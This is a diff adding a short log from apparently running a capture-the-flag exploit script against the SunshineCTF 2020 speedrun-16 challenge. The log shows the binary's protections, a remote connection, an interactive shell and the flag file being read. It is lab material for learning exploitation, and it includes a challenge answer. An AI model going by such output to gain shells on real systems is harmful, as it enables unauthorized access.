@@ -1,0 +1,17 @@
+# ./exploit_16.py REMOTE=1
+[*] '/pwd/datajerk/sunshinectf2020/speedrun-16/chall_16'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to chal.2020.sunshinectf.org on port 30016: Done
+[*] Switching to interactive mode
+$ id
+uid=1000(chall_16) gid=1000(chall_16) groups=1000(chall_16)
+$ ls -l
+total 16
+-rwxr-xr-x 1 root root     8648 Nov  7 07:49 chall_16
+-rw-r----- 1 root chall_16   43 Nov  7 08:52 flag.txt
+$ cat flag.txt
+sun{beast-and-the-harlot-73058b6d2812c771}
